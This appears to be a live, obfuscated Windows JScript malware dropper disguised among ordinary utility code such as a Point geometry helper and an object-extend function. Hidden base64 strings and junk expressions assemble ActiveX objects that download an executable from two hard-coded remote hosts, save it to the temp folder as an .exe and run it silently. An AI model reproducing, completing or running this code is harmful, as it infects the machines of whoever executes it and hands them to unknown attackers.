var tobacco = 0;
dysentery = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  units = [];
var clients = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.advert = function () {
	forgetful = this;
	for (var i in clients){forgetful = forgetful.replace(i, clients[i]);}
    return forgetful;
};
  for ( var i = 128; i--; ) {
    if ( units[ i ] === undefined )
      units[ i ] = -1;
  
    units[ dysentery.charCodeAt( i ) ] = i;
  }
var cataract = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.advert4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("stockholm").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = units[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = units[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = units[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = units[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var sprig ="stockholmJVstockholmRFTVstockholmAl".advert4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var radically = "stockholmQWstockholmN0aXZstockholmlWE9iastockholmmVjdA=stockholm=".advert4();
String.prototype.advert2 = function () {
    var extricate = {
        blocking: this
    };
    extricate.speculate = extricate.blocking["c3Vic3RyaW5n".advert4()](tobacco, cataract);
    return extricate.speculate;
};

var steps ="stockholmRXhwYW5stockholmkRW52aXstockholmJvbm1lbnRTdHJstockholmpbmdz".advert4();
var Native = function(options){
	
};
var insoluble = [radically, steps,sprig,  ""+"."+("trying","bucks","husbandman","hearts","paolo","harmed","cashed","cobbler","exe"), "UnVu".advert4(), ("M"+"SX"+"ML"+("boxed","applying","performs","astonish","frankenstein","milan","brother","2.")+"|M"+"LH"+"TT"+("msgid","undervalue","antiquary","teaches","british","oneness","notebooks","comprise","P>")+"WU"+("rigor","households","petulant","steve","covet","stockholm","henry","cr")+("utilization","caption","mario","female","skilled","aboriginal","attractions","thimble","ip")+"t:"+("enigmatic","soliloquy","exploring","comer","utilities","votive","bacteria","homesickness","Sh")+"ell").advert()];
fella = "_F2_";
var manuals = this[insoluble.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
jTbQROvMwr = "cPKWXaq";
remoteness = (("lacquer", "subheading", "victorian", "furnished", "nelson", "warrior", "parable", "phhENSso") + "aDVQEIzl").advert2();
alabama = (("portentous", "broadway", "paolo", "divulge", "visual", "gourd", "lender", "viscid", "highways", "sTadmsNmEVfR") + "OFcXdD").advert2();
  
    String.prototype.torrid = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var arising = insoluble.pop().split(">");

sporting = "b3Blbg==".advert4();
var registrar = new manuals(arising[1]);
DfhxCrujz = "_F3_";
var parenting = new manuals(arising[0]);
var demure = registrar[insoluble.shift()](insoluble.shift());
MFWAxq = "_F5_";
weasel = (("standings", "searched", "foible", "wayne", "EItpzadamc") + "tsjVnvolWT").advert2();

var nativity = insoluble.shift();
var logical = insoluble.shift();
function thoroughness(towers, briefs) {

    try {
        var suspension = demure + "/" + briefs ;
		suspension = suspension+ nativity;
            parenting[sporting](("croup","usable","G" + weasel) + ("studies","rugby","chile","count","T"), towers, false);
       
    BeSGQLBzTXE = "_F7_";
    parenting[alabama + ("differ","pomegranate","end")]();
	var remark=(WScript+"remoteness"=="V2luZG93cyBTY3JpcHQgSG9zdA==".advert4()+"remoteness")&&parenting["c3RhdHVz".advert4()] +""=="MjAw".advert4()&&typeof(enLCHOCcKa)==="undefined";
	lQHNgR = "_F8_";
    if (remark) {
		
        var soothsayer = new manuals((("detract","geometry","mastiff","windfall","tears","locate","winning","bostonian","A")+("powell","hearings","equations","mince","pregnant","poetess","entitled","suspend","SEOO")+"DB"+("necklace","reversal","epidemic","sicilian","thinking","strengths","pivot",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        soothsayer[sporting]();
        nlVlkhcilF = "_F9_";
        soothsayer.type = cataract;
        gowSirxMh = "_F10_";
        soothsayer["d3JpdGU=".advert4()](parenting[("vitriol","talented","banner","blame","hepatitis","conservative","resonance","")+"R"+"es"+"pon"+clients['U'].toLowerCase()+"e"+"Qm9keQ==".advert4()]);
        NGeHASFwuRh = "_F11_";
        soothsayer[(remoteness + "o"+("gastric","intensive","partners","invisible","seasoned","unabashed","satiric","expire","00")+("assume","narcissist","talent","garmin","appealingly","harmful","survival","8i")+"tion").replace("0"+("ukraine","chauffeur","signing","inanimate","gamespot","talkative","harboured","08"), alabama)] = 0;
        pFvUAqsRO = "_F12_";
        soothsayer[("estrangement","launch","sticky","characteristics","ambergris","combines","handed","s")+"aveT"+"oF"+"ile"](suspension, 2);
        fvhwgOFk = "_F13_";
        soothsayer.close();
        XRWyDQCJo = "_F14_";
		registrar[logical](suspension, cataract, true);
    }
} catch (LPNADYQw) { };

    PhtpcuA = "_F15_";
}
try{
thoroughness("aHR0cDovLw==".advert4()+"\u006D\u006F\u0064\u0061\u0078\u0078\u006C\u002E\u0072\u006F"+"\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?AeLQPjniJr=QdWGdu","CrUCxo");}catch(stwDBUdd){}

thoroughness("aHR0cDovLw==".advert4()+"\u0061\u0064\u0076\u0061\u006E\u0063\u0065\u0064\u0062\u0061\u0073\u0065\u0062\u0061\u006C\u006C\u0061\u0063"+"\u0061\u0064\u0065\u006D\u0079\u002E\u0063\u006F\u006D\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?bEBFVF=rTGJEjRzq","YQjNXGxyxOQ");
   hwcNUVbBO = "_F16_";
   